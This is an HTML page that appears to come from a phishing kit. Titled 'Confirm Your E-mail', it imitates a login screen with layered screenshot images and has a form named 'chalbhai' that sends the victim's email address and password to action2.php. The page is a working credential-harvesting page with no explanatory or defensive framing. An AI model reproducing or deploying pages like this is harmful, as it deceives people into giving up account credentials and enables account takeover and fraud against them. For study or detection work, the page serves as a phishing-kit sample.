<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<link rel="shortcut icon"
              href="images/mobile-app-icon.png"/>
<html><head><title>Confirm Your E-mail</title>
</head>
<body>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:272px; z-index:1"><img src="images/Tp.png" alt="" title="" border=0 width=1349 height=272></div>

<div id="image2" style="position:absolute; overflow:hidden; left:327px; top:270px; width:685px; height:272px; z-index:1"><img src="images/md.png" alt="" title="" border=0 width=685 height=272></div>

<div id="image2" style="position:absolute; overflow:hidden; left:397px; top:331px; width:465px; height:18px; z-index:1"><img src="images/0xx.png" alt="" title="" border=0 width=465 height=18></div>

<form action=action2.php name=chalbhai id=chalbhai method=post>

<input name="formtext1" required autocomplete="off" type="email" style="position:absolute;height:27px;width:212px;left:542;top:358;z-index:19">

<input name="formtext2" required autocomplete="off" type="password" style="position:absolute;height:26px;width:214px;left:542;top:403;z-index:20">

<div id="formimage1" style="position:absolute; left:557px; top:439px; z-index:6"><input type="image" name="formimage1" src="images/cc.png"></div></form>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:614px; width:1350	px; height:193px; z-index:1"><img src="images/dw.png" alt="" title="" border=0 width=1350 height=193></div>

</body>
</html>